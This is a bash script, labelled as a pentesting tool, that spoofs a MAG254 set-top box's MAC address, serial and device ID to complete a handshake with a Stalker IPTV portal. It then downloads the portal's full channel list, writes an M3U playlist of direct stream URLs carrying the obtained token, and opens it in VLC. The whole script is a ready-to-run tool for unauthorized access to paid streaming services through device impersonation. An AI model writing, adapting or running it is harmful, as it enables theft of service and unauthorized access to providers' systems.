#!/bin/bash
# macattack-fast.sh — Fastest Stalker bypass for MacAttack pentesting
# Usage: ./macattack-fast.sh <portal_url> <mac_address>

PORTAL="${1:-http://www.streamtv.to:8080}"
MAC="${2}"
M3U_FILE="/tmp/macattack_${MAC//:}.m3u"

if [ -z "$MAC" ]; then
    echo "Usage: $0 <portal_url> <mac_address>"
    echo "       $0 http://www.streamtv.to:8080 00:1A:79:XX:XX:XX"
    exit 1
fi

echo "[*] Portal: $PORTAL"
echo "[*] MAC:    $MAC"

# --- FAST HANDSHAKE: 1 request ---
# The key: Stalker portals accept a handshake with just a MAC + serial + device_id
# No pre-token needed — the portal issues one in the response

SERIAL="$(openssl rand -hex 7 | tr '[:lower:]' '[:upper:]')"
DEVICE_ID="$(echo -n "$MAC" | md5sum | cut -d' ' -f1 | tr '[:lower:]' '[:upper:]')"

echo "[*] Handshaking..."
RESPONSE=$(curl -s --max-time 10 \
  -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 5 rev: 2116 Mobile Safari/533.3" \
  -H "X-User-Agent: Model: MAG254; Link: Ethernet" \
  -b "mac=$MAC; sn=$SERIAL; stb_lang=en; timezone=Europe/London; PHPSESSID=null" \
  "$PORTAL/stalker_portal/server/load.php?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml")

# Extract token from response
TOKEN=$(echo "$RESPONSE" | grep -oP '"Token":"\K[^"]+' | head -1)
if [ -z "$TOKEN" ]; then
    TOKEN=$(echo "$RESPONSE" | grep -oP '"token":"\K[^"]+' | head -1)
fi

if [ -z "$TOKEN" ]; then
    echo "[-] Handshake failed. Response:"
    echo "$RESPONSE" | head -c 500
    exit 1
fi

echo "[+] Token: ${TOKEN:0:24}..."

# --- GET ALL CHANNELS DIRECTLY: 1 request ---
# Uses the token + MAC to pull the full channel list in one shot
echo "[*] Fetching channel list..."
CHANNELS=$(curl -s --max-time 15 \
  -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG254 stbapp ver: 5 rev: 2116 Mobile Safari/533.3" \
  -H "Authorization: Bearer $TOKEN" \
  -b "mac=$MAC; token=$TOKEN; sn=$SERIAL; stb_lang=en; timezone=Europe/London" \
  "$PORTAL/stalker_portal/server/load.php?type=itv&action=get_all_channels&JsHttpRequest=1-xml")

CH_COUNT=$(echo "$CHANNELS" | grep -oP '"id":"\K[^"]+' | wc -l)
echo "[+] $CH_COUNT channels found"

# --- GENERATE M3U WITH DIRECT STREAM URLS ---
# No per-channel create_link — we use the playlist.php endpoint directly
# which accepts MAC + token + UID in one shot

echo "#EXTM3U" > "$M3U_FILE"

# Extract channel IDs and names, build direct playlist URLs
echo "$CHANNELS" | grep -oP '"id":"[^"]+","number":"[^"]+","name":"[^"]+"' | while read -r line; do
    CID=$(echo "$line" | grep -oP '"id":"\K[^"]+')
    NAME=$(echo "$line" | grep -oP '"name":"\K[^"]+')

    # Direct stream URL — instant, no extra resolve
    STREAM="$PORTAL/stalker_portal/server/tools/playlist.php?mac=$MAC&token=$TOKEN&uid=$CID"

    echo "#EXTINF:-1,$NAME" >> "$M3U_FILE"
    echo "$STREAM" >> "$M3U_FILE"
done

echo "[+] M3U saved: $M3U_FILE ($(wc -l < "$M3U_FILE") lines)"

# --- LAUNCH VLC via vlc-stalker.sh ---
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
echo "[*] Launching VLC with zero-lag cache..."
if [ -x "$SCRIPT_DIR/vlc-stalker.sh" ]; then
    "$SCRIPT_DIR/vlc-stalker.sh" 300 "$M3U_FILE"
else
    vlc --play-and-exit \
        --ipv4-timeout=3000 --no-playlist-autostart --no-playlist-tree \
        --network-caching=300 \
        --live-caching=0 \
        --file-caching=50 \
        --http-caching=300 \
        \
        --clock-synchro=0 \
        --no-drop-late-frames \
        --no-skip-frames \
        --avcodec-hw=any \
        --rtsp-tcp \
        --no-video-title-show \
        "$M3U_FILE"
fi